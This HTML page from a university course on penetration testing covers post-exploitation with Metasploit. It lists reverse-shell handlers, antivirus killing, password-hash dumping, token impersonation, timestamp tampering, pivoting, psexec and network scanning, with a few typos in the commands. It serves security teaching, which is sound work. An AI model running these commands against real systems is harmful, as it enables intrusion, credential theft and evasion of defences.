<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <meta name="description" content="Vitaly Ford smart grid security research">
    <meta name="author" content="Vitaly Ford">
    <link rel="icon" href="../../../favicon.ico">

    <title>Vitaly Ford's Personal Website</title>

    <!-- Bootstrap core CSS -->
    <link href="../css/bootstrap.min.css" rel="stylesheet">

    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
    <link href="../css/ie10-viewport-bug-workaround.css" rel="stylesheet">

    <!-- Custom styles for this template -->
    <link href="../css/navbar-fixed-top.css" rel="stylesheet">

    <script src="../js/ie-emulation-modes-warning.js"></script>

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  </head>

  <body>

    <!-- Fixed navbar -->
    <nav class="navbar navbar-default navbar-fixed-top">
      <div class="container">
        <div class="navbar-header">
          <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
            <span class="sr-only">Toggle navigation</span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
          <p class="navbar-brand" href="#">Vitaly Ford</p>
        </div>
        <div id="navbar" class="navbar-collapse collapse">
          <ul class="nav navbar-nav">
            <li><a href="../index.html">Home</a></li>
            <li><a href="../research.html">Research</a></li>
            <li><a href="../publications.html">Publications</a></li>
            <li><a href="../docs/VitalyFordResume.pdf" target="_blank" rel="noopener norefferer">Resume</a></li>
            <li><a href="../contact.html">Contact</a></li>
      			<li class="dropdown">
      			  <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">CSC 2120 <span class="caret"></span></a>
      			  <ul class="dropdown-menu">
        				<li><a href="../2120syllabus.html">Syllabus</a></li>
        				<li><a href="../2120programs.html">Programs</a></li>
                <li><a href="../2120examples.html">Examples</a></li>
        				<li><a href="../schedule.html">Office Hours Schedule</a></li>
      			  </ul>
      			</li>
            <li class="dropdown">
              <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">CSC 2121 <span class="caret"></span></a>
              <ul class="dropdown-menu">
                <li><a href="../2121syllabus.html">Syllabus</a></li>
                <li><a href="../2121labs.html">Labs</a></li>
                <li><a href="../schedule.html">Office Hours Schedule</a></li>
              </ul>
            </li>
            <li class="dropdown">
              <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">CSC 2901 <span class="caret"></span></a>
              <ul class="dropdown-menu">
				<li><a href="CSC2901syllabus.pdf">Syllabus</a></li>
				<li><a href="00-Videos.html">00 Recordings</a></li>
                <li><a href="01-Background.html">01 Background</a></li>
                <li><a href="02-Assessment-Planning.html">02 Assessment Planning</a></li>
                <li><a href="03-Passive-Intelligence-Gathering.html">03 Passive Recon</a></li>
                <li><a href="04-Active-Intelligence-Gathering.html">04 Active Recon</a></li>
                <li><a href="05-Exploitation.html">05 Exploitation</a></li>
                <li class="active"><a href="06-Post-Exploitation.html">06 Post-Exploitation</a></li>
				<li><a href="07-Useful-Resources.html">07 Useful Resources</a></li>
              </ul>
            </li>
          </ul>
        </div><!--/.nav-collapse -->
      </div>
    </nav>

    <div class="container">

      <!-- Main component for a primary marketing message or call to action -->
      <div class="normal-text style-2901">
        <h2><code> &gt;&gt; CSC 2901 - Post-Exploitation</code></h2>
        <h2><a id="Setting_up_a_server_0"></a>Setting up a server</h2>
        <p>In Metasploit:</p>
        <pre><code class="language-sh">use exploit/multi/handler
<span class="hljs-built_in">set</span> PAYLOAD windows/x64/meterpreter/reverse_tcp
<span class="hljs-built_in">set</span> ExitOnSession <span class="hljs-literal">false</span>
<span class="hljs-built_in">set</span> LHOST ...
<span class="hljs-built_in">set</span> LPORT ...
exploit -j
        </code></pre>
        <h3><a id="Migration_to_Another_Service_for_a_Stable_Connection_10"></a>Migration to Another Service for a Stable Connection</h3>
        <p>Type to migrate to the explorer.exe service: <code>run migrate -n explorer.exe</code></p>
        <h3><a id="Switch_to_Windows_Shell_12"></a>Switch to Windows Shell</h3>
        <p>Type: <code>shell</code></p>
        <h3><a id="Enumerate_Windows_Users_14"></a>Enumerate Windows Users</h3>
        <p>Type: <code>net user</code></p>
        <h3><a id="See_Which_Users_are_Admins_16"></a>See Which Users are Admins</h3>
        <p>Type: <code>net localgroup Administrators</code></p>
        <h3><a id="List_Sessions_18"></a>List Sessions</h3>
        <p>Type: <code>sessions -l</code></p>
        <h3><a id="Interact_with_a_particular_session_20"></a>Interact with a particular session</h3>
        <p>Type: <code>sessions -i 1</code></p>
        <h3><a id="When_you_get_a_shell_on_Windows_box_22"></a>When you get a shell on Windows box:</h3>
        <pre><code class="language-sh">
sysinfo
getuid
getsystem
run killav
run post/windows/gather/checkvm
run post/windows/gather/hashdump
run winenum <span class="hljs-comment"># generic report when you compromised the machine</span>
run getcountermeasure <span class="hljs-comment"># what defensive</span>
run post/windows/gather/enum_applications
run post/windows/gather/enum_logged_on_users
run post/windows/gather/enum_shares
run post/windows/gather/enum_snmp
reg enumkey -k HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
        </code></pre>
        <h2><a id="Impersonation_of_a_User_38"></a>Impersonation of a User</h2>
        <p>Do <code>getsystem</code> before impersonating somebody:<br>
        {Just for the record, mitigation: set account to not be delegated when created in the AD to avoid impersonation}</p>
        <pre><code class="language-sh">use incognito <span class="hljs-comment">
# allows to interact with a token in the memory</span>
list_tokens -u <span class="hljs-comment"># Microsoft stores a token in memory to log in users faster</span>
list_rokens -g <span class="hljs-comment"># list groups</span>
impersonate_token DOMAIN\\Administrator
        </code></pre>
        <h4><a id="Drop_back_to_a_regular_user_47"></a>Drop back to a regular user</h4>
        <p><code>rev2self</code></p>
        <h2><a id="Prove_Access_50"></a>Prove Access</h2>
        <pre><code class="language-sh">
upload /home/Vitaly/Vitaly.txt c:\\
timestomp C:\\Vitaly.txt -v
timestomp C:\\Vitaly.txt -m <span class="hljs-string">"07/07/2017 07:07:07"</span>
timestomp C:\\Vitaly.txt -v
        </code></pre>
        <h2><a id="Enumerate_the_Network_57"></a>Enumerate the Network</h2>
        <pre><code class="language-sh">
run netenum
run netenum -ps -r <span class="hljs-number">10.10</span>.<span class="hljs-number">30.0</span>/<span class="hljs-number">24</span>
run post/windows/gather/arp_scanner RHOSTS=<span class="hljs-number">10.10</span>.<span class="hljs-number">30.0</span>./<span class="hljs-number">24</span>
        </code></pre>
        <h2><a id="Pivoting_63"></a>Pivoting</h2>
        <ul>
        <li>Setting a route through the compromised host</li>
        <li>Turning the compromised machine into a router</li>
        </ul>
        <pre><code class="language-sh">route <span class="hljs-built_in">print</span>
route add COMPROMISED_IP <span class="hljs-number">255.255</span>.<span class="hljs-number">0.0</span> SESSION_ID
        </code></pre>
        <p>Now we can run a port scan through the compromised machine:</p>
        <pre><code class="language-sh">use auxiliary/scanner/portscan/tcp
<span class="hljs-built_in">set</span> RHOSTS IP
<span class="hljs-built_in">set</span> THREADS <span class="hljs-number">10</span>
run
        </code></pre>
        <h2><a id="psexec_77"></a>psexec</h2>
        <pre><code class="language-sh">use exploit/windows/smb/psexecset SMBUSER Administrator
<span class="hljs-built_in">set</span> SMBPASS jshkjfhaturtiuye3bj873thrdsyt34nsjfkgksh
<span class="hljs-built_in">set</span> payload windows/x64/meterpreter/reverse_tcp
<span class="hljs-built_in">set</span> RHOST ...
<span class="hljs-built_in">set</span> LHOST ...
<span class="hljs-built_in">set</span> LPORT ...
exploit
        </code></pre>
        <h2><a id="Port_Forwarding_in_Metasploit_87"></a>Port Forwarding in Metasploit</h2>
        <p>First, enter in the meterpreter session.</p>
        <pre><code class="language-sh">portfwd add <span class="hljs-operator">-l</span> <span class="hljs-number">445</span> -p <span class="hljs-number">445</span> -r remote_host_ip
background
use exploit/windows/smb/psexec
setg SMBUser vagrant
setg SMBPASS vagrant
<span class="hljs-built_in">set</span> RHOST <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-comment"># the exploit has to fire back to us though</span>
<span class="hljs-built_in">set</span> LHOST our_real_IP
<span class="hljs-built_in">set</span> LPORT <span class="hljs-number">5555</span>
run
        </code></pre>
        <h2><a id="SSH_Tunnel_100"></a>SSH Tunnel</h2>
        <p>ssh -L 3389:localhost:3389 vagrant@compromised_host_IP<br>
        Open a new terminal window and type: <code>rdesktop 127.0.0.1</code></p>
        <hr>
        <h2><a id="discover_the_hosts_104"></a>Discover the Hosts</h2>
        <p>db_nmap -sn -n -v --exclude our_IP remote_IP_range<br>
        -F # top 100 ports<br>
        -sS # SYN scan<br>
        -sC # run default nse scripts according to -sV<br>
        -oX # output with XML format<br>
        –reason<br>
        –open # show results if ports are open<br>
        nmap -p- -sS -n -v  --reason --open -oX demo-ports.xml --stylesheet=nmap.xml IP # -p- all the ports from 0 to 65535</p>
        <p>nmap -sU -n -v --open --reason IP</p>
        <p>db_import demo-ports.xml</p>
        <h2><a id="service_version_scan_118"></a>Service Version Scan</h2>
        <p>db_nmap -sS -sV -sC -v -n -p 21,22,80,1617,4848,5985,8022,8080,8282,8484,8585,9200,49153 IP</p>
      </div>

    </div> <!-- /container -->


    <!-- Bootstrap core JavaScript
    ================================================== -->
    <!-- Placed at the end of the document so the pages load faster -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <script>window.jQuery || document.write('<script src="../js/jquery.min.js"><\/script>')</script>
    <script src="../js/bootstrap.min.js"></script>
    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
    <script src="../js/ie10-viewport-bug-workaround.js"></script>
  </body>
</html>
